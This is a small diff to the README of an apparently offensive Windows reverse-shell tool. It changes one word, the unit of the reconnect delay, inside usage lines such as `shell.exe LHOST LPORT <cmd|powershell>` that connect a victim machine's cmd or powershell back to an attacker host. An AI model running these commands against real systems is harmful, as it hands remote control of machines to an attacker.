@@ -3,7 +3,7 @@ An advanced windows reverse shell. Allows to specify the type of shell (cmd or p
 ## Usage
 One shot <br>
 `shell.exe LHOST LPORT <cmd|powershell> 0` <br>
-Attempt to reconnect to the specified IP. The last parameter indicates the number of seconds between attempts <br>
+Attempt to reconnect to the specified IP. The last parameter indicates the number of milliseconds between attempts <br>
 `shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY` <br>
 One shot reverse shell spawned as subprocess to keep the current terminal free. The process is disposed once the attacker closes the connection on his side<br>
 `shell.exe LHOST LPORT <cmd|powershell> 0 s` <br>
